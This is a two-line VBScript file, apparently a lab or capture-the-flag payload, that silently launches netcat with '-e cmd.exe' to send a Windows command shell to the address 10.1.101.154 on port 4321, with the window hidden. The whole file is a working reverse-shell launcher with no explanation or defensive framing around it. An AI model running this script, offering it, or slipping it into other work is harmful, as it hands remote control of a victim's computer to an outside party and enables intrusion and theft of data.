Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "nc64.exe -e cmd.exe 10.1.101.154 4321", 0, False
